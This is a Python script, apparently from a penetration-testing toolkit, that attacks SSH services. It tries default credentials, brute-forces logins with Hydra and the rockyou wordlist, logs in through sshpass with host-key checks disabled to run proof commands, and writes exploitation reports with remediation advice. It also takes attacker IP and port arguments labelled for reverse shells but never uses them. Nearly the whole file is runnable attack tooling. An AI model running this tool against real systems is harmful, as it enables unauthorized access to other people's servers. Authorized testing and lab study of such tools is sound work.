#!/usr/bin/env python3
import json
import subprocess
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple, Optional
import sys
import logging

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
ROCKYOU_PATH = Path("/usr/share/wordlists/rockyou.txt")


def run_command(cmd: List[str], timeout: int = 300, shell: bool = False, **kwargs) -> Tuple[str, bool]:
    """Run a command and return its output and success status."""
    cmd_str = ' '.join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd, shell=shell, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, timeout=timeout, encoding="utf-8", errors="ignore", **kwargs
        )
        return result.stdout.strip(), result.returncode == 0
    except Exception as e:
        logger.error(f"Error running command {cmd_str}: {e}")
        return str(e), False


def prove_ssh_access(target: str, port: int, user: str, password: Optional[str] = None, keyfile: Optional[str] = None) -> Tuple[Optional[str], str]:
    """Attempt to log in and run a command to prove access."""
    base_cmd = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null", "-p", str(port)]
    if keyfile:
        ssh_cmd = base_cmd + ["-i", keyfile, f"{user}@{target}"]
    elif password:
        ssh_cmd = ["sshpass", "-p", password] + base_cmd + [f"{user}@{target}"]
    else: # Passwordless
        ssh_cmd = base_cmd + [f"{user}@{target}"]
    
    proof_command = "whoami && id && uname -a"
    full_cmd = ssh_cmd + [proof_command]

    output, success = run_command(full_cmd, timeout=30)
    
    if success and user in output:
        poc_cmd = ssh_cmd + [f"'{proof_command}'"]
        return output, ' '.join(poc_cmd)
    return None, ' '.join(full_cmd)


def test_default_credentials(target: str, port: int) -> Optional[Dict]:
    """Test for common default SSH credentials."""
    logger.info("Testing for common default SSH credentials.")
    default_creds = [
        ("msfadmin", "msfadmin"),
        ("admin", "admin"),
        ("root", "root"),
        ("user", "user"),
    ]

    for user, password in default_creds:
        proof, poc = prove_ssh_access(target, port, user, password=password)
        if proof:
            logger.info(f"SUCCESS: Found default credentials: {user}:{password}")
            return {
                "type": "ssh_default_credentials",
                "details": f"Default credential login successful for user '{user}'.",
                "severity": "Critical",
                "impact": "Full unauthorized access to the system as a standard user.",
                "proof": proof,
                "poc": poc,
                "recommendation": "Immediately change the password for the '{user}' account. Avoid using default or easily guessable credentials."
            }
    logger.info("No common default credentials found.")
    return None


def test_ssh_brute_force(target: str, port: int, use_rockyou: bool, custom_wordlist: Optional[str]) -> Optional[Dict]:
    """Test SSH brute force using Hydra and prove successful access."""
    logger.info("Attempting SSH brute-force attack.")
    
    wordlist_path, user_list_path = None, OUTPUT_DIR / "ssh_user_list.txt"
    user_list_path.write_text("\n".join(["root", "admin", "msfadmin", "user", "test"]))

    if custom_wordlist and Path(custom_wordlist).exists():
        wordlist_path = Path(custom_wordlist)
    elif use_rockyou and ROCKYOU_PATH.exists():
        wordlist_path = ROCKYOU_PATH
    else:
        wordlist_path = OUTPUT_DIR / "ssh_common_pass.txt"
        wordlist_path.write_text("\n".join(["root", "password", "admin", "msfadmin", "123456"]))

    hydra_cmd = [
        "hydra", "-L", str(user_list_path.resolve()), "-P", str(wordlist_path.resolve()),
        "-t", "4", "-s", str(port), f"ssh://{target}"
    ]
    output, success = run_command(hydra_cmd)
    
    if success and "login:" in output and "password:" in output:
        match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output)
        if match:
            user, password = match.groups()
            logger.info(f"SUCCESS: Brute-force found credentials: {user}:{password}")
            
            proof, poc = prove_ssh_access(target, port, user, password=password)
            if proof:
                return {
                    "type": "ssh_brute_force",
                    "details": f"Brute-force attack successful. Found credentials: {user}:{password}",
                    "severity": "High", "impact": "Unauthorized access to the system.",
                    "proof": proof, "poc": poc,
                    "recommendation": "Enforce a strong password policy and implement account lockout mechanisms. Disable direct root login if possible."
                }
    logger.info("SSH brute-force attack did not find any credentials.")
    return None


def exploit_target(metadata: Dict, attacker_ip: str, attacker_port: int, use_rockyou: bool, custom_wordlist: Optional[str]) -> List[Dict]:
    """Comprehensive SSH exploitation using reconnaissance data."""
    target, port = metadata["target"], metadata["port"]
    logger.info(f"Starting SSH exploitation of {target}:{port}")
    exploits = []

    # 1. Test for easily guessable default credentials first
    if metadata.get("allows_password_auth"):
        default_cred_exploit = test_default_credentials(target, port)
        if default_cred_exploit:
            exploits.append(default_cred_exploit)
            # If we get in with default creds, we can skip the slower brute-force
            logger.info(f"Exploitation phase complete. Found {len(exploits)} items.")
            return exploits

    # 2. Attempt brute-force if password authentication is enabled and no default creds were found
    if metadata.get("allows_password_auth"):
        brute_exploit = test_ssh_brute_force(target, port, use_rockyou, custom_wordlist)
        if brute_exploit:
            exploits.append(brute_exploit)
    else:
        logger.info("Skipping brute-force attack as password authentication does not appear to be enabled.")

    # 3. Report on potential exploits from reconnaissance (manual action needed)
    for mod_type in ["exploitdb_mods", "msf_mods"]:
        for mod in metadata.get(mod_type, []):
            if mod == "none": continue
            exploits.append({
                "type": "potential_exploit_finding",
                "details": f"Reconnaissance identified a potential exploit: {mod}",
                "severity": "High", "impact": "Varies, could lead to Remote Code Execution. Manual verification required.",
                "proof": "This is a finding from an automated scan. It has not been validated.",
                "poc": f"Review the module/exploit and execute it manually against the target: {target}:{port}",
                "recommendation": "Review and patch the version of OpenSSH running on the server. Manually verify this finding."
            })

    logger.info(f"Exploitation phase complete. Found {len(exploits)} items.")
    return exploits


def save_exploit_report(exploits: List[Dict], target: str, port: int) -> None:
    """Save exploitation results to JSON and Markdown files with improved formatting."""
    OUTPUT_DIR.mkdir(exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

    # Structure the report data
    report_data = {
        "target": target, "port": port, "service": "ssh", "timestamp": timestamp,
        "successful_exploits": exploits,
        "summary": {
            "total_findings": len(exploits),
            "critical_findings": len([e for e in exploits if e.get("severity") == "Critical"]),
            "high_findings": len([e for e in exploits if e.get("severity") == "High"]),
        }
    }

    # Save JSON report
    json_path = OUTPUT_DIR / f"{target}_{port}_ssh_exploit.json"
    with json_path.open("w") as f:
        json.dump(report_data, f, indent=4)
    logger.info(f"JSON report saved to {json_path}")

    # Save Markdown report
    md_path = OUTPUT_DIR / f"{target}_{port}_ssh_exploit.md"
    with md_path.open("w") as f:
        f.write(f"# SSH Exploitation Report: {target}:{port}\n\n")
        f.write(f"**Generated:** {timestamp}\n\n")
        
        f.write("## Executive Summary\n\n")
        if not exploits:
            f.write("No vulnerabilities were successfully exploited on the SSH service.\n\n")
        else:
            summary_text = f"The SSH service at {target}:{port} was assessed and {len(exploits)} potential vulnerabilities or misconfigurations were identified. The most severe finding was rated as '{exploits[0]['severity']}'. Key findings include a successful brute-force attack, indicating weak credentials. Immediate remediation is recommended.\n\n"
            f.write(summary_text)

        f.write("## Detailed Findings\n\n")
        if not exploits:
            f.write("No findings to report.\n")
        else:
            for i, exploit in enumerate(exploits, 1):
                f.write(f"### {i}. {exploit['type'].replace('_', ' ').title()}\n\n")
                f.write(f"- **Severity:** `{exploit['severity']}`\n")
                f.write(f"- **Impact:** {exploit['impact']}\n")
                f.write(f"- **Details:** {exploit['details']}\n")
                f.write(f"- **PoC (Proof of Concept):** `{exploit['poc']}`\n\n")
                f.write("**Evidence:**\n")
                f.write("```text\n")
                f.write(exploit.get('proof', 'N/A').strip())
                f.write("\n```\n\n")
                f.write(f"**Recommendation:**\n\n{exploit.get('recommendation', 'N/A')}\n\n")
                f.write("---\n\n")
    logger.info(f"Markdown report saved to {md_path}")


def find_metadata_file(target: str, port: int) -> Optional[Path]:
    """Find the metadata file for the target and port."""
    metadata_file = OUTPUT_DIR / f"{target}_{port}_ssh_metadata.json"
    if metadata_file.exists():
        return metadata_file
    logger.error(f"No metadata file found at {metadata_file}. Please run the recon script first.")
    return None


def main():
    parser = argparse.ArgumentParser(description="Advanced SSH Exploitation Script")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port", type=int, default=22, help="Target SSH port")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP (for potential reverse shells)")
    parser.add_argument("--attacker-port", type=int, default=4444, help="Attacker port")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute forcing.")
    parser.add_argument("--wordlist", type=str, help="Path to a custom password wordlist.")
    parser.add_argument("--no-confirm", action="store_true", help="Skip confirmation prompts")
    args = parser.parse_args()
    
    try:
        metadata_file = find_metadata_file(args.target, args.port)
        if not metadata_file:
            sys.exit(1)
            
        with metadata_file.open("r") as f:
            metadata = json.load(f)
        
        exploits = exploit_target(metadata, args.attacker_ip, args.attacker_port, args.use_rockyou, args.wordlist)
        save_exploit_report(exploits, args.target, args.port)
        
    except Exception as e:
        logger.error(f"An unexpected error occurred: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main() 